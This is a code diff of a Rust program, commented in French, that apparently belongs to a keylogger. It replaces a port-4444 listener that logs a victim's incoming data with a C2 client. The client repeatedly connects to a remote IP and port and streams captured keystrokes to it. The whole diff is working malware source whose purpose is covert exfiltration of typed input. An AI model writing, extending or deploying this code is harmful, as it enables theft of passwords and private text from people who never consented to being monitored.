@@ -1,47 +1,29 @@
-use std::fs::OpenOptions;
-use std::io::{BufWriter, Write, Read}; // ✅ ajout de Read pour stream.read
-use std::net::TcpListener;
+use std::io::{Write};
+use std::net::TcpStream;
+use std::sync::mpsc::{Receiver};
+use std::thread;
+use std::time::Duration;
 
-pub fn start_server() {
-    let listener = TcpListener::bind("0.0.0.0:4444")
-        .expect("❌ Impossible d’écouter sur le port 4444");
+/// Lance la connexion vers le C2 et envoie les frappes reçues.
+pub fn start_c2_client(rx: Receiver<String>, ip: &str, port: u16) {
+    let addr = format!("{}:{}", ip, port);
 
-    println!("[*] En attente de connexions entrantes...");
-
-    for stream in listener.incoming() {
-        match stream {
+    loop {
+        match TcpStream::connect(&addr) {
             Ok(mut stream) => {
-                println!("[+] Connexion établie avec {:?}", stream.peer_addr());
+                println!("[+] Connecté au C2 à {}", addr);
 
-                let file = OpenOptions::new()
-                    .create(true)
-                    .append(true)
-                    .open("src/Logs/log.log")
-                    .expect("❌ Impossible d'ouvrir log.log");
-
-                let mut writer = BufWriter::new(file);
-                let mut buffer = [0u8; 1024];
-
-                loop {
-                    match stream.read(&mut buffer) {
-                        Ok(0) => {
-                            println!("[-] Victime déconnectée.");
-                            break;
-                        }
-                        Ok(n) => {
-                            let data = String::from_utf8_lossy(&buffer[..n]);
-                            print!("{}", data); // Affiche dans le terminal
-                            let _ = writer.write_all(data.as_bytes()); // Écrit dans le fichier
-                            let _ = writer.flush();
-                        }
-                        Err(e) => {
-                            eprintln!("❌ Erreur réseau : {}", e);
-                            break;
-                        }
+                while let Ok(keystroke) = rx.recv() {
+                    if let Err(e) = stream.write_all(keystroke.as_bytes()) {
+                        eprintln!("Erreur envoi: {:?}", e);
+                        break;
                     }
                 }
             }
-            Err(e) => eprintln!("❌ Erreur de connexion : {}", e),
+            Err(e) => {
+                eprintln!("[-] Connexion C2 échouée : {:?}. Retry...", e);
+                thread::sleep(Duration::from_secs(5));
+            }
         }
     }
 }
